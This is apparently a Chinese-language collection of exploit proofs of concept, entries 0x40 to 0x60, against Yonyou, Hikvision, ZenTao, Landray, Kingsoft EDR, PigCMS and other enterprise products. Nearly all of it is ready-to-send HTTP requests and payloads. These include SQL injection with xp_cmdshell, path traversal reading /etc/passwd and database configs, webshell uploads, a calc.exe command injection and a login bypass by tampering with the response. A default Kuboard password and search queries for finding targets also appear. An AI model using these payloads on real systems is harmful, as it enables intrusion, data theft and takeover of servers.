\------WebKitFormBoundaryvLTG6zlX0gZ8LzO3

Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"

Content-Type: application/msword

hello

\------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
# 0x40 **用友GRP-U8存在信息泄露**

GET /logs/info.log HTTP/1.1

# 0x41 **用友文件服务器认证绕过**

资产搜索：

app=”用友-NC-Cloud” 或者是app=”用友-NC-Cloud” && server==”Apache-Coyote/1.1”

POST数据包修改返回包 false改成ture就可以绕过登陆

HTTP/1.1 200 OK

Server: Apache-Coyote/1.1

Date: Thu, 10 Aug 2023 20:38:25 GMT

Connection: close

Content-Length: 17

{"login":"false"}

# 0x42 **用友时空KSOA PayBill SQL注入漏洞**

POST /servlet/PayBill?caculate&_rnd= HTTP/1.1

Host: 1.1.1.1

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

Content-Length: 134

Accept-Encoding: gzip, deflate

Connection: close

<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR
DELAY '00:00:03';-</name><name>1</name><name>102360</name></root>

命令执行：

exec master..xp_cmdshell 'whoami';

# 0x43 **用友畅捷通 T注入**

sqlmap -u http://xx.xx.xx.xx/WebSer~1/create_site.php?site_id=1 --is-dba

# 0x44 **契约锁电子签章系统 RCE**

POST /callback/%2E%2E;/code/upload HTTP/1.1

Host: ip:port

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Content-Type:multipart/form-data;

boundary=----GokVTLZMRxcJWKfeCvEsYHlszxE

\----GokVTLZMRxcJWKfeCvEsYHlszxE

Content-Disposition: form-data; name="type";

TIMETASK

\----GokVTLZMRxcJWKfeCvEsYHlszxE

Content-Disposition: form-data; name="file"; filename="qys.jpg"

马儿：

\----GokVTLZMRxcJWKfeCvEsYHlszxE

# 0x45 **蓝凌EKP远程代码执行漏洞**

/api///sys/ui/sys_ui_extend/sysUiExtend.do

POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1

Host: xxx

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36

Accept: /

Connection: Keep-Alive

Content-Length: 42

Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///etc/passwd"}}

# 0x46 **禅道v18.0-v18.3后台命令执行**

POST /zentaopms/www/index.php?m=zahost&f=create HTTP/1.1

Host: 127.0.0.1

UserAgent:
Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/110.0Accept:application/json,text/javascript,*/*;q=0.01

Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding:gzip,deflate

Referer:http://127.0.0.1/zentaopms/www/index.php?m=zahost&f=create

Content-Type:application/x-www-form-urlencoded;charset=UTF-8

X-Requested-With:XMLHttpRequest

Content-Length:134

Origin:http://127.0.0.1

Connection:close

Cookie:zentaosid=dhjpu2i3g51l6j5eba85aql27f;lang=zhcn;device=desktop;theme=default;tab=qa;windowWidth=1632;windowHeight=783

Sec-Fetch-Dest:empty

Sec-Fetch-Mode:cors

Sec-Fetch-Site:same-origin

vsoft=kvm&hostType=physical&name=penson&extranet=127.0.0.1%7Ccalc.exe&cpuCores=

2&memory=16&diskSize=16&desc=&uid=640be59da4851&type=za

# 0x47 **HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞**

/serverLog/showFile.php?fileName=../web/html/main.php

# 0x48 **HiKVISION 综合安防管理平台 files 任意文件上传漏洞**

POST /center/api/files;.html HTTP/1.1

Host: 10.10.10.10

Content-Type: multipart/form-data;
boundary=----WebKitFormBoundary9PggsiM755PLa54a--
\----WebKitFormBoundary9PggsiM755PLa54a

Content-Disposition: form-data; name="file";
filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"

Content-Type: application/zip

<%jsp 的马%>

\------WebKitFormBoundary9PggsiM755PLa54a--
# 0x49 **HiKVISION 综合安防管理平台 report 任意文件上传漏洞**

POST /svm/api/external/report HTTP/1.1

Host: 10.10.10.10

Content-Type: multipart/form-data;
boundary=----WebKitFormBoundary9PggsiM755PLa54a--
\----WebKitFormBoundary9PggsiM755PLa54a

Content-Disposition: form-data; name="file";
filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"

Content-Type: application/zip

<%jsp 的马%>

\------WebKitFormBoundary9PggsiM755PLa54a--
马儿路径：/portal/ui/login/..;/..;/new.jsp

# 0x50 **HIKVISION视频编码设备接入网关showFile.php任意文件下载**

<?php

$file_name = $_GET['fileName'];

$file_path = '../../../log/'.$file_name;

$fp = fopen($file_path,"r");

while($line = fgets($fp)){

$line = nl2br(htmlentities($line,ENT_COMPAT,"utf-8"));

echo '<spanstyle="fontsize:16px">'.$line.'</span>';

}

fclose($fp);

?>

/serverLog/showFile.php?fileName=../web/html/main.php

# 0x51 **HiKVISION综合安防管理平台env信息泄漏**

/artemis-portal/artemis/env

# 0x52 **N** **ginx配置错误导致的路径穿越风险**

漏洞自查PoC如下：

https://github.com/hakaioffsec/navgix

该漏洞非0day，是一个路径穿越漏洞，可以直接读取nginx后台服务器文件。

有多家重点金融企业已中招，建议尽快进行自查。

# 0x53 **Milesight VPN server.js 任意文件读取漏洞**

GET /../etc/passwd HTTP/1.1

Host:

Accept: /

Content-Type: application/x-www-form-urlencoded

# 0x54 **PigCMS action_flashUpload 任意文件上传漏洞**

POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload

HTTP/1.1

Host:

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=----aaa

\------aaa

Content-Disposition: form-data; name="filePath"; filename="test.php"

Content-Type: video/x-flv

<?php phpinfo();?>

\------aaa

/cms/upload/images/2023/08/11/1691722887xXb22x.php

# 0x55 **金盘 微信管理平台 getsysteminfo 未授权访问漏洞**

/admin/weichatcfg/getsysteminfo

# 0x56 **Panel loadfile 后台文件读取漏洞**

POST /api/v1/file/loadfile

{"paht":"/etc/passwd"}

# 0x57 **网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞**

/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23

# 0x58 **Kuboard默认口令**

Kuboard，是一款免费的 Kubernetes 图形化管理工具，Kuboard 力图帮助用户快速在 Kubernetes
上落地微服务。Kuboard存在默认口令可以通过默认口令登录Kuboard，管理Kubernetes。

admin/kuboard123

# 0x59 **金山EDR代码执行漏洞**

开启⽇志

/Console/inter/handler/change_white_list_cmd.php id参数

POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1

Host: 192.168.24.3:6868

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)
Gecko/20100101

Firefox/114.0

Accept: */*

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 131

Origin: http://192.168.24.3:6868

Connection: close

Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7&m2=0

{"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
AE5A","id":"111;set/**/global/**/general_log=on;","type":"0"}}

设置日志php文件

POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1

Host: 192.168.24.3:6868

Content-Length: 195

Accept: */*

X-Requested-With: XMLHttpRequest

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
(KHTML,

like Gecko) Chrome/114.0.0.0 Safari/537.36

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Origin: http://192.168.24.3:6868

Referer: http://192.168.24.3:6868/

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7

Connection: close

{"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
AE5A","id":"111;set/**/global/**/general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f6368656

36b5f6c6f67696e322e706870;","type":"0"}}

写入php代码

POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1

Host: 192.168.24.3:6868

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)
Gecko/20100101

Firefox/114.0

Accept: */*

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 222

Origin: http://192.168.24.3:6868

Connection: close

Referer: http://192.168.24.3:6868/index.php

{"settings_distribute_cmd":{"userSession":"{BD435CCE-3F91-E1AA-3844-
76A49EE862EB}","mode_id":"3AF264D9-AE5A-86F0-6882-DD7F56827017","settings":"3AF264D9-
AE5A-86F0-6882-DD7F56827017_0","SC_list":{"a":"<?php phpinfo();?>"}}}

最后get请求rce：

http://192.168.24.3:6868/check_login2.php

# 0x60 **企互联FE业务协作平台 ShowImageServlet 任意文件读取漏洞**

漏洞描述：

飞企互联 FE业务协作平台 ShowImageServlet接口存在各种文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件

漏洞影响：

/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print

